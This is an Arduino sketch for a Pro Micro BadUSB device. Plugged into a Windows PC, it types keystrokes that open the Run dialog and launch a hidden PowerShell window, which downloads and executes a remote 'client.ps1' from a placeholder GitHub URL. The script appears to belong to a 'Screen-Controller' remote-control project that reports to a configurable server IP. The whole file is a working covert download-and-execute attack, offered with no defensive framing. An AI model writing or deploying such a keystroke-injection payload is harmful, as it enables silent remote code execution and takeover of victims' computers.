/*
 * Pro Micro BadUSB - Auto runs the client
 * 
 * How it works:
 * 1. Plug into PC
 * 2. Types keyboard commands automatically
 * 3. Opens PowerShell and runs client
 */

#include <Keyboard.h>

// ============ CHANGE THIS TO YOUR SERVER IP ============
#define SERVER_IP "192.168.1.100"
#define GITHUB_URL "https://raw.githubusercontent.com/YOUR_USERNAME/Screen-Controller/main/client.ps1"
// =======================================================

void setup() {
  Keyboard.begin();
  delay(2000);  // Wait for PC to recognize keyboard
  
  // Press Win+R to open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  
  // Type PowerShell command
  Keyboard.print("powershell -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('");
  Keyboard.print(GITHUB_URL);
  Keyboard.print("')\"");
  
  // Press Enter
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  
  Keyboard.end();
}

void loop() {
  // Nothing - runs once
}
